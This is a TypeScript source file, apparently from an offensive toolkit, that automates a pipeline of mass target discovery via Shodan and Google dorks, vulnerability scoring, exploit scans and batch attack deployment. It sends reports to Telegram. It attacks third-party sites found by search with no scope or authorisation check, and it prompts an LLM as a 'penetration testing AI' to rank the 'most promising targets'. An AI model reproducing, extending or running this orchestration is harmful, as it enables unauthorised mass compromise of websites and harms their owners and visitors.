/**
 * Auto-Pipeline Engine
 * 
 * Full automation: Discover → Filter → Score → Batch Attack → Report
 * 
 * This orchestrator connects:
 *   - mass-target-discovery.ts (find targets)
 *   - non-wp-exploits.ts (scan non-WP targets)
 *   - job-runner.ts (run attacks via unified-attack-pipeline)
 *   - telegram-notifier.ts (send reports)
 */

import {
  runMassDiscovery,
  type DiscoveryConfig,
  type DiscoveryResult,
  type DiscoveredTarget,
} from "./mass-target-discovery";
import { runNonWpExploits, type NonWpScanResult } from "./non-wp-exploits";
import { startBatchJob, getJobStatus, type BatchJobParams } from "./job-runner";
import { sendTelegramNotification } from "./telegram-notifier";
import { invokeLLM } from "./_core/llm";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface PipelineConfig {
  // Discovery settings
  discovery: DiscoveryConfig;
  
  // Attack settings
  autoAttack: boolean;           // automatically start attacks after scoring
  maxConcurrentAttacks: number;  // max parallel attacks (default 3)
  attackOnlyAboveScore: number;  // only attack targets with score >= this (default 50)
  skipWaf: boolean;              // skip targets with WAF detected (default false)
  
  // Non-WP scan
  runNonWpScan: boolean;         // run non-WP exploits before main attack (default true)
  
  // Notification
  notifyTelegram: boolean;       // send results to Telegram (default true)
  
  // Callbacks
  onPhaseChange?: (phase: PipelinePhase, detail: string) => void;
  onTargetUpdate?: (target: DiscoveredTarget, status: string) => void;
  onProgress?: (phase: string, detail: string, progress: number) => void;
}

export type PipelinePhase = 
  | "idle"
  | "discovering"
  | "filtering"
  | "scoring"
  | "non_wp_scanning"
  | "attacking"
  | "reporting"
  | "completed"
  | "error";

export interface PipelineEvent {
  id: string;
  phase: PipelinePhase;
  detail: string;
  timestamp: number;
  data?: any;
}

export interface PipelineRun {
  id: string;
  startedAt: number;
  completedAt?: number;
  phase: PipelinePhase;
  
  // Discovery results
  discoveryResult?: DiscoveryResult;
  
  // Non-WP scan results
  nonWpResults: NonWpScanResult[];
  
  // Attack results
  attackDeployIds: number[];
  attackResults: AttackResult[];
  
  // Stats
  stats: PipelineStats;
  
  // Events log
  events: PipelineEvent[];
  
  // Config used
  config: PipelineConfig;
  
  // AI Report
  aiReport?: string;
}

export interface AttackResult {
  targetDomain: string;
  targetUrl: string;
  cms: string;
  vulnScore: number;
  deployId?: number;
  status: "pending" | "running" | "success" | "failed" | "skipped";
  nonWpFindings: number;
  details: string;
  startedAt?: number;
  completedAt?: number;
}

export interface PipelineStats {
  totalDiscovered: number;
  totalFiltered: number;
  totalScored: number;
  totalNonWpScanned: number;
  totalAttacked: number;
  totalSuccess: number;
  totalFailed: number;
  totalSkipped: number;
  avgVulnScore: number;
  topCms: Record<string, number>;
  durationMs: number;
}

// ═══════════════════════════════════════════════════════
//  IN-MEMORY PIPELINE STORAGE
// ═══════════════════════════════════════════════════════

const activePipelines = new Map<string, PipelineRun>();

function generatePipelineId(): string {
  return `pipe_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
}

function addEvent(run: PipelineRun, phase: PipelinePhase, detail: string, data?: any) {
  run.events.push({
    id: `evt_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
    phase,
    detail,
    timestamp: Date.now(),
    data,
  });
  run.phase = phase;
}

// ═══════════════════════════════════════════════════════
//  MAIN PIPELINE
// ═══════════════════════════════════════════════════════

export async function runAutoPipeline(config: PipelineConfig): Promise<PipelineRun> {
  const run: PipelineRun = {
    id: generatePipelineId(),
    startedAt: Date.now(),
    phase: "idle",
    nonWpResults: [],
    attackDeployIds: [],
    attackResults: [],
    stats: {
      totalDiscovered: 0,
      totalFiltered: 0,
      totalScored: 0,
      totalNonWpScanned: 0,
      totalAttacked: 0,
      totalSuccess: 0,
      totalFailed: 0,
      totalSkipped: 0,
      avgVulnScore: 0,
      topCms: {},
      durationMs: 0,
    },
    events: [],
    config,
  };

  activePipelines.set(run.id, run);

  try {
    // ═══ PHASE 1: DISCOVERY ═══
    addEvent(run, "discovering", "Starting mass target discovery...");
    config.onPhaseChange?.("discovering", "Searching Shodan + Google Dorks for vulnerable targets");
    config.onProgress?.("discovering", "Starting mass target discovery...", 5);

    const discoveryConfig: DiscoveryConfig = {
      ...config.discovery,
      onProgress: (phase, detail, progress) => {
        addEvent(run, "discovering", `[${phase}] ${detail}`);
        config.onProgress?.("discovering", detail, Math.round(progress * 0.3)); // 0-30%
      },
    };

    const discoveryResult = await runMassDiscovery(discoveryConfig);
    run.discoveryResult = discoveryResult;
    run.stats.totalDiscovered = discoveryResult.totalRawResults;
    run.stats.totalFiltered = discoveryResult.totalAfterFilter;
    run.stats.totalScored = discoveryResult.totalScored;

    addEvent(run, "discovering", 
      `Discovery complete: ${discoveryResult.targets.length} targets scored (${discoveryResult.totalRawResults} raw → ${discoveryResult.totalAfterDedup} dedup → ${discoveryResult.totalScored} scored)`,
      { totalTargets: discoveryResult.targets.length },
    );

    if (discoveryResult.targets.length === 0) {
      addEvent(run, "completed", "No targets found — pipeline finished");
      run.completedAt = Date.now();
      run.stats.durationMs = run.completedAt - run.startedAt;
      return run;
    }

    // Compute CMS distribution
    for (const t of discoveryResult.targets) {
      const cms = t.cms || "unknown";
      run.stats.topCms[cms] = (run.stats.topCms[cms] || 0) + 1;
    }
    run.stats.avgVulnScore = Math.round(
      discoveryResult.targets.reduce((s, t) => s + t.vulnScore, 0) / discoveryResult.targets.length,
    );

    // ═══ PHASE 2: NON-WP SCANNING ═══
    if (config.runNonWpScan) {
      addEvent(run, "non_wp_scanning", "Running non-WordPress exploit scans...");
      config.onPhaseChange?.("non_wp_scanning", "Scanning non-WP targets for vulnerabilities");
      config.onProgress?.("non_wp_scanning", "Running non-WP exploit scans...", 35);

      const nonWpTargets = discoveryResult.targets.filter(
        t => t.cms && t.cms !== "wordpress" && t.vulnScore >= config.attackOnlyAboveScore,
      );

      const scanBatchSize = 3;
      for (let i = 0; i < nonWpTargets.length; i += scanBatchSize) {
        const batch = nonWpTargets.slice(i, i + scanBatchSize);
        const results = await Promise.allSettled(
          batch.map(t =>
            runNonWpExploits({
              targetUrl: t.url,
              cms: t.cms,
              onProgress: (method, detail) => {
                addEvent(run, "non_wp_scanning", `[${t.domain}] ${method}: ${detail}`);
              },
            }),
          ),
        );

        for (const r of results) {
          if (r.status === "fulfilled") {
            run.nonWpResults.push(r.value);
            run.stats.totalNonWpScanned++;
          }
        }

        const pct = 35 + Math.round((i / nonWpTargets.length) * 20);
        config.onProgress?.("non_wp_scanning", `Scanned ${Math.min(i + scanBatchSize, nonWpTargets.length)}/${nonWpTargets.length} non-WP targets`, pct);
      }

      addEvent(run, "non_wp_scanning",
        `Non-WP scan complete: ${run.nonWpResults.length} targets scanned, ${run.nonWpResults.filter(r => r.successfulExploits > 0).length} with findings`,
      );
    }

    // ═══ PHASE 3: ATTACK ═══
    if (config.autoAttack) {
      addEvent(run, "attacking", "Starting batch attacks...");
      config.onPhaseChange?.("attacking", "Launching attacks on scored targets");
      config.onProgress?.("attacking", "Starting batch attacks...", 60);

      // Select targets for attack
      const attackTargets = discoveryResult.targets.filter(t => {
        if (t.vulnScore < config.attackOnlyAboveScore) return false;
        if (config.skipWaf && t.waf) return false;
        return true;
      });

      // Prepare attack results
      for (const target of attackTargets) {
        run.attackResults.push({
          targetDomain: target.domain,
          targetUrl: target.url,
          cms: target.cms || "unknown",
          vulnScore: target.vulnScore,
          status: "pending",
          nonWpFindings: run.nonWpResults.find(r => r.targetUrl === target.url)?.successfulExploits || 0,
          details: "",
        });
      }

      // Launch attacks in batches
      const attackBatchSize = config.maxConcurrentAttacks || 3;
      for (let i = 0; i < attackTargets.length; i += attackBatchSize) {
        const batch = attackTargets.slice(i, i + attackBatchSize);
        
        // Use batch job runner
        const batchParams: BatchJobParams = {
          userId: 0, // system user
          targets: batch.map(t => ({
            domain: new URL(t.url).hostname,
            redirectUrl: t.url,
          })),
        };

        try {
          const batchResult = await startBatchJob(batchParams);
          
          for (let j = 0; j < batchResult.deployIds.length; j++) {
            const deployId = batchResult.deployIds[j];
            run.attackDeployIds.push(deployId);
            const attackResult = run.attackResults.find(r => r.targetUrl === batch[j]?.url);
            if (attackResult) {
              attackResult.deployId = deployId;
              attackResult.status = "running";
              attackResult.startedAt = Date.now();
            }
          }
        } catch (e: any) {
          addEvent(run, "attacking", `Batch attack failed: ${e.message}`);
        }

        const pct = 60 + Math.round((i / attackTargets.length) * 30);
        config.onProgress?.("attacking", `Launched ${Math.min(i + attackBatchSize, attackTargets.length)}/${attackTargets.length} attacks`, pct);
      }

      run.stats.totalAttacked = run.attackResults.filter(r => r.status !== "skipped").length;
      addEvent(run, "attacking", `Attacks launched: ${run.stats.totalAttacked} targets`);
    } else {
      // Mark all as skipped if autoAttack is false
      for (const target of discoveryResult.targets) {
        run.attackResults.push({
          targetDomain: target.domain,
          targetUrl: target.url,
          cms: target.cms || "unknown",
          vulnScore: target.vulnScore,
          status: "skipped",
          nonWpFindings: 0,
          details: "Auto-attack disabled",
        });
      }
      run.stats.totalSkipped = discoveryResult.targets.length;
    }

    // ═══ PHASE 4: REPORTING ═══
    addEvent(run, "reporting", "Generating AI report...");
    config.onPhaseChange?.("reporting", "Generating final report");
    config.onProgress?.("reporting", "Generating AI report...", 92);

    // Generate AI report
    try {
      const reportData = {
        totalDiscovered: run.stats.totalDiscovered,
        totalScored: run.stats.totalScored,
        avgVulnScore: run.stats.avgVulnScore,
        topCms: run.stats.topCms,
        nonWpFindings: run.nonWpResults.filter(r => r.successfulExploits > 0).length,
        criticalFindings: run.nonWpResults.reduce((s, r) => s + r.criticalFindings, 0),
        attacksLaunched: run.stats.totalAttacked,
        topTargets: discoveryResult.targets.slice(0, 10).map(t => ({
          domain: t.domain,
          cms: t.cms,
          score: t.vulnScore,
          difficulty: t.attackDifficulty,
          indicators: [
            t.hasOpenUpload && "open_upload",
            t.hasExposedConfig && "exposed_config",
            t.hasVulnerableCms && "vuln_cms",
            t.hasWeakAuth && "weak_auth",
          ].filter(Boolean),
        })),
      };

      const llmResp = await invokeLLM({
        messages: [
          {
            role: "system",
            content: "You are a penetration testing AI. Generate a concise executive summary of the auto-pipeline results. Include: key findings, most promising targets, recommended next steps. Reply in Thai. Keep it under 500 words.",
          },
          {
            role: "user",
            content: `Auto-Pipeline Results:\n${JSON.stringify(reportData, null, 2)}`,
          },
        ],
      });
      const content = llmResp.choices?.[0]?.message?.content;
      run.aiReport = typeof content === "string" ? content : undefined;
    } catch {}

    // Send Telegram notification
    if (config.notifyTelegram) {
      try {
        const msg = [
          `🎯 Auto-Pipeline Complete`,
          ``,
          `📊 Discovery: ${run.stats.totalDiscovered} raw → ${run.stats.totalScored} scored`,
          `📈 Avg Score: ${run.stats.avgVulnScore}/100`,
          `🔍 Non-WP Scanned: ${run.stats.totalNonWpScanned}`,
          `⚔️ Attacks: ${run.stats.totalAttacked}`,
          ``,
          `Top 5 Targets:`,
          ...discoveryResult.targets.slice(0, 5).map((t, i) =>
            `${i + 1}. ${t.domain} (${t.cms || "?"}) — Score: ${t.vulnScore}, ${t.attackDifficulty}`,
          ),
          ``,
          `Duration: ${Math.round((Date.now() - run.startedAt) / 1000)}s`,
        ].join("\n");

        await sendTelegramNotification({ targetUrl: "auto-pipeline", type: "info", details: msg });
      } catch {}
    }

    // ═══ COMPLETE ═══
    run.completedAt = Date.now();
    run.stats.durationMs = run.completedAt - run.startedAt;
    run.phase = "completed";
    addEvent(run, "completed", `Pipeline complete in ${Math.round(run.stats.durationMs / 1000)}s`);
    config.onProgress?.("completed", "Pipeline complete!", 100);

  } catch (e: any) {
    addEvent(run, "error", `Pipeline error: ${e.message}`);
    run.phase = "error";
    run.completedAt = Date.now();
    run.stats.durationMs = run.completedAt - run.startedAt;
  }

  return run;
}

// ═══════════════════════════════════════════════════════
//  PIPELINE MANAGEMENT
// ═══════════════════════════════════════════════════════

export function getPipelineRun(id: string): PipelineRun | undefined {
  return activePipelines.get(id);
}

export function getActivePipelines(): PipelineRun[] {
  return Array.from(activePipelines.values());
}

export function getPipelineEvents(id: string, afterTimestamp?: number): PipelineEvent[] {
  const run = activePipelines.get(id);
  if (!run) return [];
  if (afterTimestamp) {
    return run.events.filter(e => e.timestamp > afterTimestamp);
  }
  return run.events;
}

export function cancelPipeline(id: string): boolean {
  const run = activePipelines.get(id);
  if (!run || run.phase === "completed" || run.phase === "error") return false;
  addEvent(run, "error", "Pipeline cancelled by user");
  run.completedAt = Date.now();
  run.stats.durationMs = run.completedAt - run.startedAt;
  return true;
}

// Clean up old pipelines (keep last 20)
export function cleanupPipelines() {
  const all = Array.from(activePipelines.entries())
    .sort((a, b) => b[1].startedAt - a[1].startedAt);
  if (all.length > 20) {
    for (const [id] of all.slice(20)) {
      activePipelines.delete(id);
    }
  }
}
